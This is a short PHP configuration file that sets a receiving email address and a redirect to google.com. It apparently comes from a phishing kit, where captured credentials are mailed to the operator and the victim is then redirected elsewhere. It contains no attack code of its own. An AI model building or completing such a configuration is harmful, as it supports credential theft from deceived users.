<?php 
$Receive_email="acegreen900@gmail.com";
$redirect="https://www.google.com/";
?>